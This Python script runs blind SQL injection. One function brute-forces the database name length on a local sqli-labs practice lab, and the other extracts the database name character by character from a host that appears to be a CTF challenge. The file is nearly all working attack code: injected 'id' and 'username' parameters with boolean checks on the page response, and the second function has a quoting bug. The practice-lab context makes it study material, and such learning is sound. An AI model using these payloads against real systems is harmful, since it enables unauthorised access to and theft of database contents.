import requests


def database_len():
    for i in range(1, 10):
        url = '''http://127.0.0.1/sqli-labs-master/Less-8/index.php'''
        payload = '''?id=1' and length(database())>%s''' % i
        # print(url+payload+'%23')
        r = requests.get(url + payload + '%23')
        if 'You are in' in r.text:
            print(i)

        else:
            # print('false')
            print('database_length:', i)
            break


database_len()


def database_name():
    name = ''
    for j in range(1, 9):
        for i in 'sqcwertyuioplkjhgfdazxvbnm':
            url = "http://dcb0fa5e-22b5-43c1-bfbe-8850de8e9d53.node4.buuoj.cn:81/check.php?username=admin' and substr(database(),{0},1)={1}&password='1".format (j, i)
            # print(url+'%23')
            r = requests.get(url)
            requests.adapters.DEFAULT_RETRIES = 5
            if 'Success' in r.text:
                name = name + i

                print(name)

                break
    print('database_name:', name)


database_name()